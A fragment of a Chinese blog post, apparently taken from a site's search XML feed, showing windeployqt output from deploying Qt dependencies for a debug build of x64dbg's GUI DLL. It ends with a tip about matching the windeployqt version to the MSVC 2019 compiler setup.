<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">λ windeployqt.exe --force E:\Code\WinProjects\x64dbg\bin\x32d\x32gui.dll</span><br><span class="line">E:\Code\WinProjects\x64dbg\bin\x32d\x32gui.dll 32 bit, debug executable</span><br><span class="line">Adding Qt5Svg <span class="keyword">for</span> qsvgicond.dll</span><br><span class="line">Skipping plugin qtvirtualkeyboardplugind.dll due to disabled dependencies (Qt5Qml Qt5Quick).</span><br><span class="line">Skipping plugin qtvirtualkeyboard_hanguld.dll due to disabled dependencies (Qt5Qml Qt5Quick).</span><br><span class="line">Skipping plugin qtvirtualkeyboard_openwnnd.dll due to disabled dependencies (Qt5Qml Qt5Quick).</span><br><span class="line">Skipping plugin qtvirtualkeyboard_pinyind.dll due to disabled dependencies (Qt5Qml Qt5Quick).</span><br><span class="line">Skipping plugin qtvirtualkeyboard_tcimed.dll due to disabled dependencies (Qt5Qml Qt5Quick).</span><br><span class="line">Skipping plugin qtvirtualkeyboard_thaid.dll due to disabled dependencies (Qt5Qml Qt5Quick).</span><br><span class="line">Direct dependencies: Qt5Core Qt5Gui Qt5Network Qt5Widgets Qt5WinExtras</span><br><span class="line">All dependencies   : Qt5Core Qt5Gui Qt5Network Qt5Widgets Qt5WinExtras</span><br><span class="line">To be deployed     : Qt5Core Qt5Gui Qt5Network Qt5Svg Qt5Widgets Qt5WinExtras</span><br><span class="line">Warning: Cannot find Visual Studio installation directory, VCINSTALLDIR is not <span class="built_in">set</span>.</span><br><span class="line">Updating Qt5Cored.dll.</span><br><span class="line">Updating Qt5Guid.dll.</span><br><span class="line">Updating Qt5Networkd.dll.</span><br><span class="line">......</span><br><span class="line">Updating qwindowsvistastyled.dll.</span><br><span class="line">Creating qt_da.qm...</span><br><span class="line">Creating qt_de.qm...</span><br><span class="line">Creating qt_en.qm...</span><br><span class="line">Creating qt_es.qm...</span><br><span class="line">Creating qt_fi.qm...</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>这里需要注意的 windeployqt.exe 需要与编译选项对应，这里我选择的是<code>msvc2019/bin/windeployqt.exe</code>。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Debug</tag>
      </tags>
  </entry>
</search>
